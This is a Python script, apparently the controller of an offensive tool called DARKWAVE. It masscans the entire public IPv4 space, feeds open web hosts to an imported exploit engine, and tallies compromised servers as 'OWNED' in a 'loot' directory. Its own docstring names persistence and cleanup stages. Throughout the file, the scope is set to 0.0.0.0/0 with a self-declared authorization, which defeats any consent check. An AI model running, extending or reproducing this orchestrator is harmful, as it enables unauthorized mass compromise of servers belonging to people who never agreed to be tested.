#!/usr/bin/env python3
"""DARKWAVE runner: masscan -> fingerprint -> exploit -> persist/patch/clean."""
from __future__ import annotations
import ipaddress, json, os, queue, random, re, signal, subprocess, sys, threading, time
from datetime import datetime, timezone

sys.path.insert(0, "/opt/dwsweep")
from dwscan.config import Profile, Scope
from dwscan.audit import Audit
from dwscan.engine import process
from dwscan.errors import AbortConditions
from dwscan.exploit import NativeRunner
from dwscan.models import Verdict

BASE = "/opt/dwsweep"
DW = os.environ.get("DW_DIR", "/var/lib/dw")
STATE = os.path.join(DW, "state.json")
STOP = os.path.join(DW, "STOP")
CONF = os.environ.get("DW_CONF", os.path.join(BASE, "sweep.conf"))
RANGES = os.environ.get("DW_RANGES", "")

DEFAULT = {"rate": 6000, "workers": 200, "ports": "80,443", "batch": 6,
           "queue_max": 40000, "seed": 20261123}
SKIP = ["0.0.0.0/8", "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16",
        "172.16.0.0/12", "192.168.0.0/16", "224.0.0.0/4", "240.0.0.0/4",
        "255.255.255.255/32"]
SKIP_NETS = [ipaddress.ip_network(n) for n in SKIP]

conf = {**DEFAULT}
if os.path.exists(CONF):
    conf.update(json.load(open(CONF)))
os.makedirs(DW, exist_ok=True)
os.makedirs("/opt/dwsweep/loot", exist_ok=True)
audit = Audit(os.path.join(BASE, "loot", "audit.jsonl"))
q: "queue.Queue" = queue.Queue(maxsize=conf["queue_max"])
seen: set[str] = set()
lock = threading.Lock()
run_id = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
t0 = time.time()
stop = threading.Event()
stats = {"scanned": 0, "open": 0, "php": 0, "owned": 0, "queue": 0,
         "blocks_done": 0, "blocks_total": 0, "pps": 0, "pct": 0.0,
         "status": "starting", "run": run_id}


def save_state(**kw):
    stats.update(kw)
    stats["elapsed"] = int(time.time() - t0)
    with lock:
        with open(STATE + ".tmp", "w") as f:
            json.dump(stats, f)
        os.replace(STATE + ".tmp", STATE)


def state_loop():
    last_open = 0
    while not stop.is_set():
        with lock:
            o = stats["open"]
        pps = int((o - last_open) / 3) if o >= last_open else 0
        last_open = o
        try:
            save_state(queue=q.qsize(), pps=pps)
        except Exception:
            pass
        time.sleep(3)


def worker():
    runner = NativeRunner(mib=conf.get("mib", 2), levels=62, timeout=conf.get("timeout", 18))
    prof = Profile.load("sweep")
    prof.workers = 1
    scope = Scope(cidrs=["0.0.0.0/0"], authorized_by="darkwave")
    abort = AbortConditions(max_streak=10**9)
    abort.start()
    while not stop.is_set():
        try:
            url = q.get(timeout=2)
        except queue.Empty:
            continue
        try:
            r = process(url, prof, scope, audit, runner, abort)
            audit.write("host", r.best.value, url, php=r.target.php_version or "")
            with lock:
                stats["php"] += 1 if r.findings else 0
                stats["last_host"] = url; stats["last_verdict"] = r.best.value
                if r.findings and r.findings[0].verdict == Verdict.OWNED:
                    stats["owned"] += 1
                    print(f"OWNED {url}", flush=True)
                    if not conf.get("keep_going", True):
                        stop.set()
        except Exception as e:
            audit.write("engine", "error", url, error=f"{type(e).__name__}: {e}")


def masscan_blocks(blocks):
    args = ["masscan", "-p" + conf["ports"], "--rate", str(conf["rate"]),
            "--wait", "2", "-oL", os.path.join(DW, "scan.lst"), "-v"] + blocks
    p = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    total = 65536 * len(blocks)
    pos = 0
    fd = p.stderr.fileno()
    buf = b""
    os.set_blocking(fd, False)
    while True:
        try:
            chunk = os.read(fd, 65536)
        except BlockingIOError:
            chunk = b""
        if chunk:
            buf += chunk
        while b"\r" in buf or b"\n" in buf:
            buf = buf.replace(b"\r\n", b"\n").replace(b"\r", b"\n")
            line, _, buf = buf.partition(b"\n")
            text = line.decode("utf-8", "replace")
            m = re.search(r"([\d.]+)% done", text)
            if m and p.poll() is None:
                pct = float(m.group(1))
                with lock:
                    if pct - stats.get("pct_emit", -99) >= 2 or pct >= 99:
                        audit.write("masscan", "progress", ",".join(blocks), pct=pct)
                    stats["pct_emit"] = pct
                    stats["pct"] = round((stats["blocks_done"] * 100 + pct) / max(stats["blocks_total"], 1), 3)
                    stats["scanned"] = int(stats["blocks_done"] * 65536 + pct * total / 100)
        if p.poll() is not None and not chunk:
            break
        try:
            with open(os.path.join(DW, "scan.lst")) as f:
                f.seek(pos)
                for ln in f:
                    parts = ln.split()
                    if len(parts) >= 4 and parts[0] == "open":
                        key = parts[3] + ":" + parts[2]
                        with lock:
                            add = key not in seen
                            if add:
                                seen.add(key)
                        if add:
                            audit.write("open", "open", f"{parts[3]}:{parts[2]}")
                            with lock:
                                stats["open"] += 1
                            try:
                                port=int(parts[2]); scheme="https" if port in (443,8443) else "http"
                                q.put(f"{scheme}://{parts[3]}:{port}", timeout=3)
                            except queue.Full:
                                pass
                pos = f.tell()
        except FileNotFoundError:
            pass
        time.sleep(0.4)
    p.wait()


def main():
    random.seed(conf["seed"])
    res = os.path.join(DW, "resume.txt")
    nets = []
    if conf.get("ranges"):
        for a in conf["ranges"]:
            for b in range(256):
                nets.append(f"{a}.{b}.0.0/16")
        with lock: stats["blocks_total"] = len(nets)
        save_state(status="running")
        threading.Thread(target=state_loop, daemon=True).start()
        for _ in range(conf["workers"]):
            threading.Thread(target=worker, daemon=True).start()
        b_ = conf["batch"]
        for i in range(0, len(nets), b_):
            if stop.is_set() or os.path.exists(STOP): break
            grp = nets[i:i+b_]
            audit.write("masscan", "block", ",".join(grp), rate=conf["rate"])
            if os.environ.get("DW_ARTEX"):
                subprocess.run(["sh", os.path.join(BASE, "feed_push.sh")], timeout=60)
            masscan_blocks(grp)
            with open(res, "a") as f: f.write("\n".join(grp) + "\n")
            with lock: stats["blocks_done"] += len(grp)
            save_state()
        save_state(status="done"); return
    for a in range(0, 224):
        n = ipaddress.ip_network(f"{a}.0.0.0/8")
        if any(n.subnet_of(s) for s in SKIP_NETS):
            continue
        for b in range(256):
            blk = f"{a}.{b}.0.0/16"
            if not any(ipaddress.ip_network(blk).subnet_of(s) for s in SKIP_NETS):
                nets.append(blk)
    done = set()
    if os.path.exists(res):
        done = set(open(res).read().split())
    nets = [n for n in nets if n not in done]
    with lock:
        stats["blocks_total"] = len(nets)
    save_state(status="running")
    os.makedirs("/opt/dwsweep", exist_ok=True)
    threading.Thread(target=state_loop, daemon=True).start()
    for _ in range(conf["workers"]):
        threading.Thread(target=worker, daemon=True).start()

    batch = conf["batch"]
    for i in range(0, len(nets), batch):
        if stop.is_set() or os.path.exists(STOP):
            break
        grp = nets[i:i + batch]
        audit.write("masscan", "block", ",".join(grp), rate=conf["rate"])
        masscan_blocks(grp)
        with open(res, "a") as f:
            f.write("\n".join(grp) + "\n")
        with lock:
            stats["blocks_done"] += len(grp)
        audit.write("coverage", "block_done", ",".join(grp), done=stats["blocks_done"])
        save_state()
    save_state(status="stopped" if (stop.is_set() or os.path.exists(STOP)) else "done")


if __name__ == "__main__":
    signal.signal(signal.SIGTERM, lambda *a: (stop.set(), sys.exit(0)))
    main()
